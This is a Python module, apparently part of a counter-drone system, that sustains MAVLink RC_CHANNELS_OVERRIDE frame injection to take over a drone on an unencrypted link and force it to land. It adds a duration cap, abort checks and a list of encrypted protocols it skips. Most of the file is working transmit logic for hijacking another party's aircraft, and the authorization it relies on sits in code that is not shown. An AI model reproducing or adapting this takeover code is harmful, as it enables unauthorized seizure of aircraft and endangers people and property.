#!/usr/bin/env python3
"""Bounded, immediately-abortable sustained RC_CHANNELS_OVERRIDE takeover.

This is the SUSTAINED-injection primitive behind payload PL-011
(MANEUVER TAKEOVER / CONTROLLED LANDING). It re-emits a single byte-accurate
RC_CHANNELS_OVERRIDE frame (built by backend/mavlink_codec.py) at the RC
update rate to walk a legacy/unencrypted-MAVLink craft down to a controlled
landing — the comparatively humane counterpart to the one-shot
flight-termination / force-disarm effects already in this system.

=============================================================================
SAFETY MODEL (mirrors field-bridge/jam_bridge.py's bounded-burst + abort)
=============================================================================
Authorization is NOT this module's job and is NOT re-implemented here. A
takeover only ever runs because POST /api/payloads/deploy already passed the
full, hardened gate chain (require_commander + effect+target-bound arm token +
_check_tx_not_halted + authorized-target + fire-time IFF-not-friendly +
range-auth lease). This module is the transmit plumbing that the deploy path's
"packet" carries sustain metadata into — it adds NO new authorization path and
NO way to transmit while bypassing those gates.

What this module DOES guarantee, independently and locally:

  1. BOUNDED. The stream runs for the operator-set duration but is HARD-CAPPED
     at MAX_DURATION_S (30s). It is a bounded engagement window, never
     transmit-forever. The cap is enforced on wall-clock time, not trusted
     from the caller.

  2. IMMEDIATELY ABORTABLE. tx_halted (EMERGENCY ABORT) and a per-run
     stop_event are polled BEFORE EVERY SINGLE FRAME. An abort arriving
     mid-stream terminates the takeover before the next frame goes out — an
     in-progress controlled-landing is stopped, not just future requests
     refused. When the stream stops, the RC override is released (the craft
     falls back to its own RC/failsafe), which is the intended safe end state.

  3. HONEST. RC override has NO effect against an FHSS/encrypted control link
     (ELRS/CRSF, DJI OcuSync, DSMX, hop-paired RC). If the target link is
     encrypted/hop-paired, run_sustained_takeover REFUSES and reports
     not-applicable rather than transmitting uselessly. See
     ENCRYPTED_LINK_PROTOCOLS below and the scope note in mavlink_codec.py.
"""
from __future__ import annotations

import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))
from mavlink_codec import payload_maneuver_takeover  # noqa: E402

# Hard cap — kept identical to payload_library.MANEUVER_TAKEOVER_MAX_DURATION_S.
# Duplicated (not imported) for the same reason hackrf_jam.MAX_DURATION_S is:
# the field bridge is a separately-deployable process. Update both together.
MAX_DURATION_S = 30.0

# Link protocols against which RC_CHANNELS_OVERRIDE is a NO-OP (encrypted /
# frequency-hopping / crypto-bound). A takeover targeting any of these is
# reported not-applicable and NOT transmitted. Match is case-insensitive /
# substring, since detection "protocol" strings vary.
ENCRYPTED_LINK_PROTOCOLS = (
    "elrs", "crsf", "expresslrs", "ocusync", "lightbridge", "dji",
    "dsmx", "dsm2", "spektrum", "frsky", "accst", "access", "flysky",
    "afhds", "hott", "ghst", "tbs", "crossfire", "encrypted", "fhss",
)


def link_is_overridable(protocol: Optional[str]) -> bool:
    """True only if the target's RF link plausibly accepts unauthenticated
    legacy MAVLink RC override. Encrypted/FHSS links => False (not applicable).
    Unknown/empty is treated as overridable=True ONLY so an explicitly-labeled
    legacy MAVLink craft (or an operator who has already confirmed the surface)
    is not blocked — callers should still prefer an explicit protocol."""
    if not protocol:
        return True
    p = protocol.lower()
    return not any(tok in p for tok in ENCRYPTED_LINK_PROTOCOLS)


@dataclass
class TakeoverResult:
    ok: bool
    frames_sent: int = 0
    elapsed_s: float = 0.0
    stopped_early: bool = False       # aborted by tx_halted / stop_event
    not_applicable: bool = False      # refused: encrypted/FHSS link
    error: Optional[str] = None
    reason: Optional[str] = None


def run_sustained_takeover(
    send_frame: Callable[[bytes], None],
    target_system: int,
    target_component: int = 1,
    duration_s: float = 8.0,
    rc_rate_hz: float = 20.0,
    stop_event: Optional[threading.Event] = None,
    tx_halted: Optional[Callable[[], bool]] = None,
    target_protocol: Optional[str] = None,
    on_started: Optional[Callable[[], None]] = None,
    now: Callable[[], float] = time.monotonic,
    sleep: Callable[[float], None] = time.sleep,
) -> TakeoverResult:
    """Emit RC_CHANNELS_OVERRIDE controlled-landing frames at rc_rate_hz for a
    bounded, hard-capped duration, aborting immediately on tx_halted/stop_event.

    send_frame(frame_bytes) does the actual TX (e.g. serial.write). It is
    injected so this is unit-testable with a fake sink and a fake clock.
    tx_halted() is polled before every frame; stop_event.is_set() likewise.
    now()/sleep() are injectable for deterministic tests.
    """
    # --- Honesty gate: encrypted/FHSS link => not applicable, transmit nothing.
    if not link_is_overridable(target_protocol):
        return TakeoverResult(
            ok=False, not_applicable=True,
            reason=(f"RC override not applicable: target link '{target_protocol}' is "
                    f"encrypted/frequency-hopping — RC_CHANNELS_OVERRIDE is ignored by "
                    f"such a craft. No RF transmitted."),
        )

    if rc_rate_hz <= 0:
        return TakeoverResult(ok=False, error="rc_rate_hz must be > 0")

    # --- Bound the duration on our side; never trust the caller past the cap.
    capped = max(0.0, min(float(duration_s), MAX_DURATION_S))
    if capped <= 0.0:
        return TakeoverResult(ok=False, error="duration_s must be > 0")
    period = 1.0 / rc_rate_hz

    def _halted() -> bool:
        if stop_event is not None and stop_event.is_set():
            return True
        if tx_halted is not None and tx_halted():
            return True
        return False

    # Abort even before the first frame if an abort is already in effect.
    if _halted():
        return TakeoverResult(ok=True, stopped_early=True, frames_sent=0, elapsed_s=0.0,
                              reason="EMERGENCY ABORT in effect before takeover start")

    if on_started is not None:
        on_started()

    start = now()
    deadline = start + capped
    frames = 0
    seq = 0
    try:
        while True:
            # (1) Poll abort BEFORE every frame — an abort here stops the stream
            #     before the next override goes out.
            if _halted():
                elapsed = now() - start
                return TakeoverResult(ok=True, stopped_early=True, frames_sent=frames,
                                      elapsed_s=elapsed,
                                      reason="EMERGENCY ABORT — takeover terminated mid-stream")
            # (2) Hard duration bound.
            t = now()
            if t >= deadline:
                return TakeoverResult(ok=True, stopped_early=False, frames_sent=frames,
                                      elapsed_s=t - start,
                                      reason="bounded takeover window elapsed; RC override released")
            # (3) One controlled-landing override frame.
            frame = payload_maneuver_takeover(target_system, target_component, seq=seq & 0xFF)
            send_frame(frame)
            frames += 1
            seq += 1
            # (4) Sleep to the next RC tick, but not past the deadline; wake to
            #     re-check the abort promptly.
            remaining = deadline - now()
            if remaining <= 0:
                continue
            sleep(min(period, remaining))
    except Exception as e:  # never raise out of the transmit loop
        return TakeoverResult(ok=False, frames_sent=frames, elapsed_s=now() - start,
                              error=f"takeover TX error: {e}")
